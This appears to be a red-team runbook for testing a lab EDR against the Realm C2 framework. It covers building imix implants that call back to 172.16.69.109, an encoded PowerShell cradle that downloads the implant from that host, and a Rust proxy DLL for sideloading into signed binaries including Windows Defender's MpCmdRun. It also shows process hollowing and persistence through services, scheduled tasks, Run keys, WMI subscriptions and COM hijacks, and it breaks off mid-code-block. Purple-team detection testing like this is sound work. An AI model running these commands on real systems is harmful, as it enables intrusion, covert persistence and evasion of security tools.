# Realm C2 Full Kill-Chain Emulation Runbook — Attacker Box → Drop → Evasion → Persistence

> **Scenario:** Two-machine lab. **ATTACKER** (any laptop/VM with Go + Rust) runs Tavern and
> builds implants. **VICTIM** is this Windows Server running the CCDC EDR
> (`python -m edr`, console at http://127.0.0.1:8420). You "have a shell" on VICTIM — in a
> real test that's the initial-access foothold CCDC red teams start from; here it's any
> Administrator cmd/PowerShell session you open. Walk every step, and after each one check
> the console live panel (or `curl http://127.0.0.1:8420/api/state` → `alerts`) for the
> expected rule. A step where nothing fires is a detection gap — note it, continue, fix later.
>
> **Rules of engagement:** lab network only; the callback URI baked into each build points at
> ATTACKER's lab IP only. Every artifact is named/prefixed so you can audit cleanup.

## Table of Contents

- [Quickstart — the full run, start to finish, using `poc-scripts/`](#quickstart--the-full-run-start-to-finish-using-poc-scripts)
- [Phase 0 — Topology and EDR prep (VICTIM)](#phase-0--topology-and-edr-prep-victim)
- [Phase 1 — C2 infrastructure on the ATTACKER box](#phase-1--c2-infrastructure-on-the-attacker-box)
- [Phase 2 — Build the implant battery on ATTACKER](#phase-2--build-the-implant-battery-on-attacker)
- [Phase 3 — Delivery from the simulated shell (VICTIM)](#phase-3--delivery-from-the-simulated-shell-victim)
  - [3.1 PowerShell download cradle](#31-powershell-download-cradle-the-classic-stager)
  - [3.2 Direct copy over the "shell"](#32-direct-copy-over-the-shell-simulating-already-exfiltrated-delivery)
  - [3.3 Guardrail-failure launch (negative test)](#33-guardrail-failure-launch-negative-test--implant-that-wont-run)
- [Phase 4 — Execution + evasion options (VICTIM, shell)](#phase-4--execution--evasion-options-victim-shell)
  - [4.1 Baseline execution (implant A)](#41-baseline-execution-implant-a)
  - [4.2 Stripped build (implant B)](#42-stripped-build-implant-b)
  - [4.3 DLL sideload-style execution (implant D)](#43-dll-sideload-style-execution-implant-d)
  - [4.4 Jittered HTTP beacon (implant E)](#44-jittered-http-beacon-implant-e)
  - [4.5 Inverted channel (`tcp_bind`) — expected gap](#45-inverted-channel-tcp_bind--expected-gap-file-it)
  - [4.6 ADVANCED — DLL sideloading via search-order hijack (proxy DLL)](#46-advanced--dll-sideloading-via-search-order-hijack-proxy-dll)
  - [4.7 ADVANCED — Process hollowing (signed-process impersonation)](#47-advanced--process-hollowing-signed-process-impersonation)
  - [4.8 ADVANCED — Sideloading into Windows Defender itself](#48-advanced--sideloading-into-windows-defender-itself-t1574002)
- [Phase 5 — Persistence, method by method](#phase-5--persistence-method-by-method-victim-shell)
  - [5.1 Service persistence](#51-service-persistence-implant-c)
  - [5.2 Scheduled task](#52-scheduled-task)
  - [5.3 Registry Run key](#53-registry-run-key)
  - [5.4 Startup folder](#54-startup-folder)
  - [5.5 WMI event subscription (fileless)](#55-wmi-event-subscription-fileless-persistence--the-advanced-case)
  - [5.6 imix's own `install` subcommand](#56-imixs-own-install-subcommand-implant-native-persistence)
  - [5.7 ADVANCED — COM object hijacking](#57-advanced--com-object-hijacking-t1546015-)
  - [5.8 ADVANCED — Screensaver + Winlogon hijacks](#58-advanced--screensaver--winlogon-hijacks-t1546002--t1547004-)
  - [5.9 ADVANCED — PowerShell profile hijack](#59-advanced--powershell-profile-hijack-t1546013-)
  - [5.10 ADVANCED — BITS job persistence](#510-advanced--bits-job-persistence-t1197-)
  - [5.11 ADVANCED — Silent Process Exit / IFEO GlobalFlag](#511-advanced--silent-process-exit--ifeo-globalflag-very-advanced)
  - [5.12 ADVANCED — Hidden local account](#512-advanced--hidden-local-account)
- [Phase 6 — Advanced evasion & anti-tamper battery](#phase-6--advanced-evasion--anti-tamper-battery-manual-per-technique)
  - [6.1 AMSI bypass, then cradle the real implant](#61-amsi-bypass-then-cradle-the-real-implant-)
  - [6.2 Security-log clearing](#62-security-log-clearing-)
  - [6.3 Defender exclusion + real-time-monitoring tamper](#63-defender-exclusion--real-time-monitoring-tamper-)
  - [6.4 Masqueraded implant — fake `svchost.exe`](#64-masqueraded-implant--fake-svchostexe-)
  - [6.5 Injection family via Atomic Red Team](#65-injection-family-via-atomic-red-team-)
  - [6.6 PPID-spoofed implant launch](#66-ppid-spoofed-implant-launch-)
  - [6.7 Telemetry-blinding techniques — expected N/A](#67-telemetry-blinding-techniques--expected-na-verify-the-architecture-holds)
  - [6.8 ADVANCED — fodhelper UAC bypass → elevated implant launch](#68-advanced--fodhelper-uac-bypass--elevated-implant-launch-t1548002-)
  - [6.9 Script-host LOLBIN launchers](#69-script-host-lolbin-launchers-)
  - [6.10 ADVANCED — UAC bypass family](#610-advanced--uac-bypass-family-fodhelpers-siblings-)
  - [6.11 ADVANCED — Service misconfiguration privesc](#611-advanced--service-misconfiguration-privesc)
  - [6.12 VERY ADVANCED — Process ghosting / herpaderping](#612-very-advanced--process-ghosting--herpaderping)
  - [6.13 VERY ADVANCED — Sleep obfuscation](#613-very-advanced--sleep-obfuscation-in-memory-encryption)
  - [6.14 C2 channel — named-pipe beacons](#614-c2-channel--named-pipe-beacons-cobalt-strike-smb-pivot)
- [Phase 7 — EDR's own telemetry as the scoreboard](#phase-7--edrs-own-telemetry-as-the-scoreboard)
- [Phase 8 — Full cleanup](#phase-8--full-cleanup)
- [Phase 9 — Lateral movement battery](#phase-9--lateral-movement-battery-two-machine--domain-required)
- [Extending the run later](#extending-the-run-later)

---

## Quickstart — the full run, start to finish, using `poc-scripts/`

Every command below is scripted. The scripts live in the repo:

```
poc-scripts/
  attacker/                        <- run on the Realm box (172.16.69.109, needs Go + Rust)
    01-setup-and-build.sh          clone realm, build Tavern + implants A-E into ~/realm-share
    02-run-tavern.sh               start the C2 server (own terminal, leave running)
    03-serve.sh                    HTTP-serve the binaries on :8000
    proxy-dll/                     Rust proxy-DLL crate for the sideload tests (4.6/4.8)
  victim/                          <- run on THIS server (elevated PowerShell)
    01-deliver-and-launch.ps1      Phase 3+4: cradle, implant launch, masquerade
    02-persistence-tests.ps1       Phase 5: service/task/runkey/startup/WMI/COM/scr/profile/BITS
    03-advanced-tests.ps1          Phase 6: AMSI/log-clear/exclusion/UAC-key/script-host/Defender-sideload
    04-sideload-gencmd.ps1         4.6 helper: find a signed VERSION.dll host + stage it
    check-alerts.ps1               Phase 7 scoreboard: tally + coverage check
    05-full-cleanup.ps1            Phase 8: remove everything + fresh baseline
```

**Step 1 — ATTACKER (172.16.69.109), one-time setup:**

```bash
chmod +x poc-scripts/attacker/*.sh
./poc-scripts/attacker/01-setup-and-build.sh     # builds Tavern + implant battery A-E
```

**Step 2 — ATTACKER, start the C2 (two terminals):**

```bash
./poc-scripts/attacker/02-run-tavern.sh          # Tavern server
./poc-scripts/attacker/03-serve.sh               # binaries on http://172.16.69.109:8000/
```

**Step 3 — VICTIM (this machine), start the EDR and baseline:**

```powershell
cd C:\Users\Administrator\Desktop\CCDC-EDR-SIEM-design
python -m edr                                     # console: http://127.0.0.1:8420
# wait ~1 min for sensors to warm up, then:
curl.exe -X POST http://127.0.0.1:8420/api/baseline
```

**Step 4 — VICTIM, run the test battery in order:**

```powershell
cd C:\Users\Administrator\Desktop\CCDC-EDR-SIEM-design\poc-scripts\victim
.\01-deliver-and-launch.ps1                       # delivery + execution + masquerade
# let the implant beacon 2-3 min (watch NET-BEACON), then:
Stop-Process -Name sysupd -Force
Copy-Item C:\Users\Public\sysupd.exe C:\Users\Public\sysupd2.exe -ErrorAction SilentlyContinue
.\02-persistence-tests.ps1                        # 9 persistence methods, ~35s apart
.\03-advanced-tests.ps1                           # anti-tamper + UAC + script hosts + Defender sideload
.\04-sideload-gencmd.ps1                          # optional: prep the generic 4.6 sideload
```

**Step 5 — scoreboard:**

```powershell
.\check-alerts.ps1        # prints per-rule counts + which expected rules have NOT fired yet
```

Anything listed under "NOT YET SEEN" is either an untested phase or a filed gap (see the
known-gaps list at the end of Phase 7).

**Step 6 — cleanup and fresh baseline:**

```powershell
.\05-full-cleanup.ps1     # removes every artifact the battery creates + re-baselines
```

The phases below are the same run with full explanations, expected alerts, manual
(non-scripted) commands, and the reasoning behind each detection — use the scripts for the
mechanics, the phases for understanding what you're verifying.

---

## Phase 0 — Topology and EDR prep (VICTIM)

1. Note VICTIM's lab IP: `ipconfig` → this machine's lab IP
2. ATTACKER (your Realm/Tavern box) is **172.16.69.109**
3. Start the EDR: `python -m edr` (from repo root). Verify:
   - `curl http://127.0.0.1:8420/api/state` → `kernel_trace` shows the ETW session active
   - `eventlog_records` and `events_total` are climbing
4. Take a fresh baseline via the console (or `curl -X POST http://127.0.0.1:8420/api/baseline`)
   **after** the EDR has been running a few minutes — you want a clean T0 persistence snapshot.

Keep the `/api/state` output open in a terminal; after each step below, grep it for the
expected rule IDs:

```bash
watch -n 3 "curl -s http://127.0.0.1:8420/api/state | python -m json.tool | grep -A2 rule"
```

---

## Phase 1 — C2 infrastructure on the ATTACKER box

```bash
git clone https://github.com/spellshift/realm.git && cd realm
git checkout -b latest $(git tag | tail -1)
go run ./tavern
```

- Tavern's web UI + GraphQL come up on its default port; the `/status` endpoint serves the
  server public key that implant builds auto-fetch.
- Allow the port through the attacker box's firewall if the lab has one enabled
  (`sudo ufw allow` / Windows Defender Firewall inbound rule) — otherwise every implant test
  fails for network reasons and pollutes the results.

## Phase 2 — Build the implant battery on ATTACKER

All in `implants/imix/`. Build all five up front so Phase 3-5 don't require switching machines:

| Tag | Build | Compiled-in callback | Purpose |
|---|---|---|---|
| **A** | `IMIX_CALLBACK_URI=http://172.16.69.109:8080 cargo build --release` | gRPC | baseline delivery + execution |
| **B** | same + `strip target/release/imix.exe` | gRPC | signature robustness (stripped) |
| **C** | `cargo build --release --features win_service` | gRPC | service persistence |
| **D** | DLL target (`cargo build --release --lib`) | gRPC | LOLBIN/sideload execution |
| **E** | `IMIX_CONFIG=cfg.yaml` with HTTP transport, `interval: 10`, `jitter: 0.5` | http1 | jittered beacon cadence test |

Serve the binaries over HTTP so the "shell" can pull them:

```bash
cd target/release && python -m http.server 8000
# binaries now at http://172.16.69.109:8000/imix.exe etc.
```

---

## Phase 3 — Delivery from the simulated shell (VICTIM)

Open an Administrator PowerShell on VICTIM — this is your "shell." Try each delivery method
**one at a time**, deleting the file between attempts and recording which fired.

### 3.1 PowerShell download cradle (the classic stager)

```powershell
powershell -NoProfile -EncodedCommand <base64 of: IWR http://172.16.69.109:8000/imix.exe -OutFile $env:TEMP\sysupd.exe>
```

**Expected alerts:**
- `PROC-ENC-PS` (high) — encoded PowerShell on the WMI process poll
- `EVT-4688-SUSP` (high) — same command line seen independently via kernel-fed 4688
- `SIG-REALM-IMIX` + `SIG-RUST-IMPLANT` (critical/high) — on-write/interval scan of the dropped exe
- If anything downloads via `certutil -urlcache`, `bitsadmin /transfer`, or `mshta http:` →
  `PROC-LOLBIN-DOWNLOAD` (high) fires instead — try one of those too as a variation.

### 3.2 Direct copy over the "shell" (simulating already-exfiltrated delivery)

```powershell
Copy-Item \\172.16.69.109\share\imix.exe $env:TEMP\sysupd.exe
```

**Expected:** the SIG rules on write. No command-line rule fires — that's correct, delivery
by copy has no suspicious invocation. The file scanner is the only tripwire, which is why
on-write scanning matters.

### 3.3 Guardrail-failure launch (negative test — implant that won't run)

Build **F** on ATTACKER with `IMIX_GUARDRAILS=file:/C:/does/not/exist`, deliver, launch:

```powershell
& $env:TEMP\sysupd.exe
```

The process starts, checks the guardrail, exits in <1s. **Expected:** the EDR still records
the attempt: `EVT-4688-TEMP` (high) from the kernel-fed launch path, plus the SIG rules from
the drop. If the launch is invisible, your 4688 consumer has a gap — this is the single most
important negative test in the runbook because real red teams probe with throwaway stagers
exactly like this.

---

## Phase 4 — Execution + evasion options (VICTIM, shell)

For each: launch, let it callback for 2–3 minutes, watch for `NET-BEACON`, then kill it.

### 4.1 Baseline execution (implant A)

```powershell
& $env:TEMP\sysupd.exe   # leave running
```

**Expected chain, in order:**
1. `EVT-4688-TEMP` (high) at launch — kernel-fed, near-instant
2. `PROG-IMPLANT-LAUNCH` (critical) — the WMI poll's on-launch image scan (≤3s later)
3. `NET-BEACON` (critical) after several callback intervals (~60–90s at default interval)
4. The resident process is visible in the process table with full command line

Kill: `Stop-Process -Name sysupd -Force`.

### 4.2 Stripped build (implant B)

Same procedure. The point: `SIG-REALM-IMIX` config strings survive stripping (they're
runtime env-var lookups compiled into `.rodata`), so the write-scan should still hit. If only
`SIG-RUST-IMPLANT` fires, the family rule is string-fragile — record which strings survived:

```powershell
Select-String -Path $env:TEMP\sysupd.exe -Pattern "IMIX_","eldritch","tavern" -SimpleMatch
```

### 4.3 DLL sideload-style execution (implant D)

```powershell
Copy-Item \\172.16.69.109\share\imix.dll C:\Users\Public\update.dll
rundll32 C:\Users\Public\update.dll,Start
```

**Expected:**
- `SIG-REALM-IMIX` on the DLL write to `C:\Users\Public` (it's in the scan dirs)
- `EVT-4688-TEMP`-family launch detection (the rule covers `\users\public\` paths)
- If run argument-less from an Explorer/Office parent: `PROC-SUSP-PARENT` (critical) and
  `PROC-RUNDLL-NOARG` (medium). From your shell the parent is your terminal — to exercise
  `PROC-SUSP-PARENT` honestly, launch the `rundll32` from a Word/spoolsv-style parent in a
  scratch test, or accept the rule stays untested this pass.

### 4.4 Jittered HTTP beacon (implant E)

Deliver and run as in 4.1. With `interval: 10, jitter: 0.5` the callbacks land every 5–15s.
**Expected:** `NET-BEACON` still fires — your cadence analyzer is jitter-tolerant. If it only
fires at low jitter, widen its tolerance; if it never fires on HTTP (vs gRPC), the flow
parser is dropping non-TLS flows — check the network sensor.

### 4.5 Inverted channel (`tcp_bind`) — expected gap, file it

Build **G** with a `tcp_bind` transport listening on, say, 4444. The implant never
initiates egress. **Expected today:** SIG rules on write + launch rules fire, but **no
network detection** — nothing connects out. This is the pre-filed gap from the build guide:
add a rule for a non-service process binding a listener on a non-standard port (your process
sensor already has the PIDs; a periodic `Get-NetTCPConnection -State Listen` sweep keyed to
owning process closes it).

### 4.6 ADVANCED — DLL sideloading via search-order hijack (proxy DLL)

**The technique:** Windows resolves a DLL imported by name through the search order —
application directory first. Copy a *signed* executable that imports a common DLL into a
user-writable folder, put your own DLL (named to match the import) next to it, and the
signed loader pulls in your code with the parent process looking completely legitimate.
This is the delivery used against Havoc/CS victims in the wild (see the Huntress writeup in
the research guide) and is exactly what "unsigned module inside a signed process" detection
exists for.

**Step 1 — find a signed host binary on VICTIM that imports a hijackable DLL.**
Many System32 binaries statically import `VERSION.dll` or `dwmapi.dll`. Find one by parsing
imports (no tools needed):

```powershell
# quick heuristic: scan a few System32 exes for a VERSION.dll import string in the import table
foreach ($exe in "Taskmgr.exe","resmon.exe","eventvwr.exe","winhlp32.exe","sigverif.exe") {
  $b = [IO.File]::ReadAllBytes("C:\Windows\System32\$exe")
  $s = [Text.Encoding]::ASCII.GetString($b)
  if ($s -match 'VERSION\.dll') { "$exe imports VERSION.dll" }
}
```

Pick one that reports a match (e.g. `sigverif.exe`, `resmon.exe`). Verify it's signed:

```powershell
Get-AuthenticodeSignature C:\Windows\System32\sigverif.exe | Select Status, SignerCertificate
```

**Step 2 — build the proxy DLL on ATTACKER.** A plain imix.dll renamed to `version.dll`
won't work: the loader resolves the host's imports *by export name*, and a DLL missing
`GetFileVersionInfoW` etc. fails to load. You need a **proxy/forwarder**: exports matching
the real DLL, each delegating to the genuine `version.dll` in System32, plus an init that
starts the implant. Minimal Rust skeleton (`implants/` sibling crate, build with the same
toolchain as imix):

```rust
// src/lib.rs — benign lab proxy: forwards VERSION.dll exports, then runs the implant
use windows_sys::Win32::Foundation::{HMODULE, FARPROC};
use windows_sys::Win32::System::LibraryLoader::{LoadLibraryA, GetProcAddress};

static REAL: fn() -> HMODULE = || unsafe {
    // load the genuine DLL explicitly from System32 to avoid recursing into ourselves
    LoadLibraryA(b"C:\\Windows\\System32\\version.dll\0".as_ptr())
};

macro_rules! fwd { ($name:literal) => {
    #[no_mangle] pub extern "system" fn $name() -> FARPROC {
        unsafe { GetProcAddress(REAL(), stringify!($name)) }
    }
} }
// forward the handful of exports the host actually imports; add more if load fails
fwd!(GetFileVersionInfoW);
fwd!(GetFileVersionInfoSizeW);
fwd!(VerQueryValueW);

#[no_mangle]
pub extern "system" fn DllMain(_h: isize, reason: u32, _: *const u8) -> i32 {
    if reason == 1 {   // DLL_PROCESS_ATTACH — one-shot implant start
        std::process::Command::new(r"C:\Users\Public\sysupd.exe").spawn().ok();
    }
    1
}
```

```toml
# Cargo.toml
[lib] crate-type = ["cdylib"]
[dependencies.windows-sys] version = "0.59" features = ["Win32_Foundation","Win32_System_LibraryLoader"]
```

```bash
cargo build --release --target x86_64-pc-windows-msvc
# -> version.dll proxy. (Run a full `dumpbin /exports version.dll` check if the host
#    fails to start: every import the host binds must have a forwarder.)
```

For a pure detection test you can leave the implant out entirely — replace the `DllMain`
body with a marker write (`std::fs::write(r"C:\Users\Public\sideload_proof.txt", b"x")`).
The sideload telemetry is identical and nothing callbacks.

**Step 3 — stage and launch on VICTIM (your shell):**

```powershell
New-Item -ItemType Directory -Force C:\Users\Public\SigCheck | Out-Null
Copy-Item C:\Windows\System32\sigverif.exe C:\Users\Public\SigCheck\   # signed loader
Copy-Item \\172.16.69.109\share\version.dll C:\Users\Public\SigCheck\  # your proxy
Copy-Item \\172.16.69.109\share\imix.exe    C:\Users\Public\sysupd.exe # implant (optional)
& C:\Users\Public\SigCheck\sigverif.exe     # signed exe loads YOUR version.dll
```

Confirm the hijack worked: `sideload_proof.txt` appears, or the implant process
(`sysupd.exe`) shows `sigverif.exe` as its parent.

**Expected EDR behavior today:**
- `SIG-REALM-IMPLANT`-family rules on the **implied writes**: `sysupd.exe` and (if it
  contains IMIX strings) the proxy DLL land in `C:\Users\Public` → scanned on write/interval
- `EVT-4688-TEMP` (high) when **`sysupd.exe` launches** — its path is user-writable, and the
  4688 rule pattern matches `\users\public\`
- `PROG-IMPLANT-LAUNCH` (critical) — the WMI-poll image scan of the spawned implant
- `NET-BEACON` if the implant runs long enough
- The signed `sigverif.exe` launch itself is (correctly) not flagged by command-line rules —
  it's a signed binary with no arguments

**The real detection gap this test exposes — file it:** your EDR has **no module-load
telemetry**. The defining anomaly of sideloading — an *unsigned DLL loaded into a signed
process from a user-writable directory* — is invisible to you; today you only catch the
*consequences* (child implant). Closing it needs Sysmon Event ID 7 (already consumed by your
eventlog sensor if Sysmon is installed — a rule "Image is signed & Module path under
\Users\ & module unsigned" would fire directly on the hijack) or a
`Microsoft-Windows-Kernel-Image` ETW consumer. Until then, this attack's earliest tripwire
in your stack is the on-write scan of the staged files.

Cleanup: remove `C:\Users\Public\SigCheck`, `sysupd.exe`, `sideload_proof.txt`; kill any
resident implant.

### 4.7 ADVANCED — Process hollowing (signed-process impersonation)

**The technique:** start a legitimate signed process suspended, replace its image in memory
with the implant, resume. The process list shows a perfectly normal binary; the malicious
code never exists as a file relation to that process. Same detection family as 4.6: this is
what your launch-scan and module telemetry can't see directly — but note what it *cannot*
hide: the **spawned suspended process from an odd parent**, and any files the implant stages.

**Manual test without offensive tooling:** a benign lab hollowing demo is a ~40-line C#
snippet (CreateProcess suspended → WriteProcessMemory on the hollowed region → resume) that
injects a byte-patch that just calls `Sleep` in a loop — but rather than hand-rolling it,
use the standard defensive-testing route: **MITRE CALDERA or Atomic Red Team**
`T1055.012`:

```powershell
# from an elevated shell on VICTIM (Atomic Red Team installed)
Import-Module .\invoke-atomicredteam.ps1
Invoke-AtomicTest T1055.012 -TestNumbers 1   # AtomicTest: Process Hollowing via PowerShell
```

**Expected EDR behavior today:**
- The PowerShell host running the atomic gets normal process telemetry; if the invocation
  uses `-EncodedCommand`, `PROC-ENC-PS` fires
- The hollowed target process (usually a suspended `svchost`/`notepad` spawned by an odd
  parent) **should** trip `PROC-SUSP-PARENT` if the parent is a script interpreter — check
  whether your current regex catches the parent pair the atomic uses; if not, that's the gap
- **Known gap to file:** no RWX-allocation or remote-write telemetry exists in a usermode
  ETW-audit-only build — the canonical detection is ETW `Thread` start-address outside any
  image plus Sysmon EID 8/10. Same backlog item as 4.6's module telemetry: install Sysmon
  and your existing eventlog sensor will ingest its events; add the suspend-spawn correlation
  rule then.

Cleanup: `Invoke-AtomicTest T1055.012 -Cleanup` plus any stray processes.

### 4.8 ADVANCED — Sideloading into Windows Defender itself (T1574.002)

**The technique:** Defender's own signed binaries are the most-abused sideload hosts in
real intrusions. Two documented paths:

- **`MpCmdRun.exe` + `mpclient.dll`** — LockBit's signature move ([SentinelOne:
  Living Off Windows Defender](https://www.sentinelone.com/blog/living-off-windows-defender-lockbit-ransomware-sideloads-cobalt-strike-through-microsoft-security-tool/),
  [Hijack Libs entry](https://hijacklibs.net/entries/microsoft/built-in/mpclient.html)):
  copy the signed Defender CLI to a user-writable folder, drop a proxy `mpclient.dll`
  beside it, and your code runs inside a Microsoft-signed Defender process.
- **`MsMpEng.exe` + `mpsvc.dll`** — the REvil/Kaseya delivery ([Fortinet
  analysis](https://www.fortinet.com/blog/threat-research/dll-side-loading-technique-used-in-recent-kaseya-ransomware-attack)):
  the antimalware engine itself loads `mpsvc.dll` from its start directory.

The canonical detection — used by the published [Sigma
rule](https://detection.fyi/sigmahq/sigma/windows/process_creation/proc_creation_win_mpcmdrun_dll_sideload_defender/)
and FortiSIEM — is simple and matches your sensor fidelity exactly: **a Defender binary
(`MpCmdRun.exe`, `NisSrv.exe`, `MsMpEng.exe`) executing from anywhere other than
`C:\Program Files\Windows Defender\`.** A named rule for this (`PROC-DEFENDER-SIDELOAD`,
critical) is now in your rules engine.

**Step 1 — stage the signed host on VICTIM (your shell):**

```powershell
New-Item -ItemType Directory -Force C:\Users\Public\DefCheck | Out-Null
Copy-Item 'C:\Program Files\Windows Defender\MpCmdRun.exe' C:\Users\Public\DefCheck\
# telemetry-only variant: also copy the real DLLs so the tool actually runs
Copy-Item 'C:\Program Files\Windows Defender\mpclient.dll' C:\Users\Public\DefCheck\
& C:\Users\Public\DefCheck\MpCmdRun.exe -Scan -ScanType 1
```

**Expected:** `EVT-DEFENDER-SIDELOAD` (critical) — the kernel-fed 4688 path catches the
launch even though `MpCmdRun -Scan` exits in seconds; `PROC-DEFENDER-SIDELOAD` (critical)
fires the same way from the WMI poll when the process lives long enough; plus the generic
`EVT-4688-TEMP` (high). **Verified live on this machine** — a ready-made script is at
`tests\defender_sideload_test.ps1` (copies the genuine signed MpCmdRun + mpclient.dll to
`C:\Users\Public\DefCheck` and runs a scan; zero malicious code — the anomaly is the path).

**Step 2 — full sideload with your proxy DLL (ATTACKER build):** build the same Rust
proxy pattern from §4.6, named `mpclient.dll`. `MpCmdRun.exe` imports a larger export
surface than `version.dll` — generate the forwarder list from the genuine DLL:

```powershell
# on a machine with the SDK (or use dumpbin /exports):
$exp = dumpbin /exports 'C:\Program Files\Windows Defender\mpclient.dll'
# feed the exported names into the fwd! macro list in the proxy crate
```

The proxy's `DllMain` runs the same benign marker-write (or spawns
`C:\Users\Public\sysupd.exe` for the full-chain version). Deploy:

```powershell
Copy-Item \\172.16.69.109\share\mpclient.dll C:\Users\Public\DefCheck\   # replaces the real one
& C:\Users\Public\DefCheck\MpCmdRun.exe -Scan -ScanType 1
# proof: sideload_proof.txt appears, or sysupd.exe shows MpCmdRun.exe as parent
```

**Expected full-chain alerts:** `PROC-DEFENDER-SIDELOAD` (critical) at launch;
`SIG-REALM-IMIX`/`SIG-RUST-IMPLANT` on the staged `sysupd.exe` write; the proxy DLL
itself only alerts if it carries IMIX strings (a pure forwarder won't — that's the
module-telemetry gap again); `PROG-IMPLANT-LAUNCH` + `NET-BEACON` if the implant runs.

**Same test, engine variant:** copy `MsMpEng.exe` instead and proxy `mpsvc.dll` — the
`PROC-DEFENDER-SIDELOAD` rule covers all three Defender binary names, so both paths
alert identically. (MsMpEng started from a user dir will fail to fully initialize without
its platform files — the launch alert still fires, which is the point.)

**Note the delicious irony to watch for:** this test makes Defender execute *your* code —
while your EDR watches. That's the whole reason the technique is popular; your counter is
that path-based detection doesn't care what the binary's signature says.

Cleanup: remove `C:\Users\Public\DefCheck`, marker files, and any spawned implant.

---

## Phase 5 — Persistence, method by method (VICTIM, shell)

Run each with the implant already delivered to a known path (use `%TEMP%\sysupd.exe` /
`C:\Users\Public\sysupd.exe` so the binPath itself is also anomalous). After each, wait one
audit cycle (≤30s) and confirm **both** the auditor diff alert and, where noted, the
event-log alert. Remove the artifact before the next method and re-baseline only at the very
end (leaving artifacts in place between methods would collapse the diffs).

### 5.1 Service persistence (implant C)

```powershell
sc create CCDCImixSvc binPath= "C:\Users\Public\imix_svc.exe" start= auto
sc start CCDCImixSvc
```

**Expected:** `EVT-7045` (critical) at install from the System channel, then `PERS-SERVICE`
(critical) from the auditor. The service build with `win_service` actually runs as a service
here — this is the only persistence method where the implanted artifact keeps beaconing from
`SYSTEM` context, so `NET-BEACON` should also fire from the service process.

Cleanup: `sc stop CCDCImixSvc; sc delete CCDCImixSvc`

### 5.2 Scheduled task

```powershell
schtasks /create /tn "CCDCImixTask" /sc minute /mo 5 /tr "C:\Users\Public\sysupd.exe" /ru SYSTEM
schtasks /run /tn CCDCImixTask
```

**Expected:** `EVT-4698` (high) at creation, `PERS-TASK` (high) at the next audit cycle, and
when the task fires: the full launch chain (`EVT-4688-TEMP` + `PROG-IMPLANT-LAUNCH`) because
the exe lives in a user-writable path — persistence that re-executes your implant is a
built-in regression test of the launch detections every 5 minutes.

Cleanup: `schtasks /delete /f /tn CCDCImixTask`

### 5.3 Registry Run key

```powershell
New-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run `
  -Name "CCDCImixRun" -Value "C:\Users\Public\sysupd.exe" -PropertyType String
```

**Expected:** `PERS-RUNKEY` (high) within one audit cycle. Then optionally sign out/in (or
`explorer` restart) to watch the full launch chain fire on the autorun execution itself.

Cleanup: `Remove-ItemProperty HKCU:\...\Run -Name CCDCTestRun` (name it CCDCTest* for easy audit)

### 5.4 Startup folder

```powershell
Copy-Item C:\Users\Public\sysupd.exe "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\ccdc_imix.exe"
```

**Expected:** `PERS-STARTUP` (high) from the auditor; the dropped exe in a roaming profile
also gets signature-scanned depending on depth settings.

Cleanup: delete the file.

### 5.5 WMI event subscription (fileless persistence — the advanced case)

```powershell
$filter = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments @{
  Name='CCDCImixFilter'; EventNameSpace='root\cimv2'; QueryLanguage='WQL';
  Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_Processor' AND TargetInstance.PercentProcessorTime > 0"}
$consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\subscription -Arguments @{
  Name='CCDCImixConsumer'; CommandLineTemplate="$env:TEMP\sysupd.exe"}
Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\subscription -Arguments @{
  Filter=$filter; Consumer=$consumer}
```

**Expected:** `PERS-WMI-SUB` (critical) — the auditor enumerates all three classes in
`root\subscription` and diffs. The trigger fires within ~60s, which then exercises the launch
chain again. If this doesn't alert, check the auditor's PowerShell subprocess isn't timing
out (WMI enumeration is the slowest of its collectors).

Cleanup:

```powershell
Get-WmiObject __EventFilter -Namespace root\subscription -Filter "Name='CCDCImixFilter'" | Remove-WmiObject
Get-WmiObject CommandLineEventConsumer -Namespace root\subscription -Filter "Name='CCDCImixConsumer'" | Remove-WmiObject
Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Object {$_.Filter -match 'CCDCImix'} | Remove-WmiObject
```

### 5.6 imix's own `install` subcommand (implant-native persistence)

On VICTIM with implant A delivered:

```powershell
& $env:TEMP\sysupd.exe install
```

This executes the embedded `main.eldritch` tome — whatever persistence the tome defines gets
created using the OS primitives above. **Expected:** whichever artifact type it drops, the
corresponding auditor alert fires; additionally any `*.eldritch` file written to disk hits
`SIG-ELDRITCH-TOME` (high). This step tests the *chain*, not a new location: implant →
tome → persistence → auditor.

### 5.7 ADVANCED — COM object hijacking (T1546.015) 🔧

**The technique:** shadow an HKLM COM CLSID with an HKCU entry pointing at your DLL —
persistence that fires whenever *any* system component instantiates the class, no Run key
or service involved. The standard references are the [ired.team COM hijacking
page](https://www.ired.team/offensive-security/persistence/t1122-com-hijacking), the
[Hacking Articles walkthrough](https://www.hackingarticles.in/windows-persistence-com-hijacking-mitre-t1546-015/),
and [Atomic Red Team T1546.015](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.015/T1546.015.md)
for the exact test GUID. Elastic's published detection is exactly what your auditor now
implements: HKCU `CLSID\{...}\InprocServer32` pointing outside system directories.

**Manual PoC (VICTIM shell):**

```powershell
# stage payload DLL (reuse your benign proxy from 4.6, or the imix DLL)
Copy-Item \\172.16.69.109\share\proxy.dll C:\Users\Public\comhost.dll
# shadow a CLSID in HKCU (GUID from the atomic test; triggers on explorer COM activity)
New-Item -Path "HKCU:\Software\Classes\CLSID\{018D5C66-4533-4307-4C62-71923BBF5B6B}" -Force
New-Item -Path "HKCU:\Software\Classes\CLSID\{018D5C66-4533-4307-4C62-71923BBF5B6B}\InprocServer32" -Force
Set-ItemProperty "HKCU:\Software\Classes\CLSID\{018D5C66-4533-4307-4C62-71923BBF5B6B}\InprocServer32" `
  -Name "(default)" -Value "C:\Users\Public\comhost.dll"
```

**Expected:** `PERS-COM` (critical) within one 30s audit cycle — the auditor enumerates
HKCU CLSID InprocServer32 values pointing outside `C:\Windows` / `C:\Program Files` and
diffs against baseline. Cleanup: `Remove-Item -Recurse HKCU:\Software\Classes\CLSID\{018D...}`.

### 5.8 ADVANCED — Screensaver + Winlogon hijacks (T1546.002 / T1547.004) ⚡

**Manual PoC (screensaver — HKCU, safe):**

```powershell
